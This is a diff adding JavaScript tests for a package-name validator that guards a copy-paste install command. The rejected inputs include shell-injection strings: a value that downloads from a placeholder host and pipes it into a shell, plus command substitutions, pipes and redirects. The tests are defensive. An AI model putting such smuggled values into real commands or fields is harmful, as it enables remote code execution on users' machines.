@@ -121,3 +121,16 @@ test("build lab verdicts never call a wheel without an extension module a workin
   assert.equal(v({ outcome: "failed", reason: "unsupported platform" }).kind, "unsupported");  // uvloop on Windows: not a failure
   assert.equal(v({ outcome: "timeout", seconds: 2400 }).text, "didn't finish building in 40 min");
 });
+
+test("isPackageName accepts PEP 508 names (#57)", () => {
+  for (const name of ["numpy", "zope.interface", "A_b-c", "x", "Pillow", "backports.zoneinfo", "a1"]) {
+    assert.equal(logic.isPackageName(name), true, name);
+  }
+});
+
+test("isPackageName refuses anything that could change the copy-paste command (#57)", () => {
+  for (const name of ["", "foo; curl https://evil.example/x | sh #", "foo bar", "foo|sh", "foo`id`", "$(id)", "foo$(id)",
+    "-rf", "foo-", ".foo", "foo&&id", "foo>out", "foo\nbar", "foo\n", null, undefined, 3]) {
+    assert.equal(logic.isPackageName(name), false, JSON.stringify(name));
+  }
+});
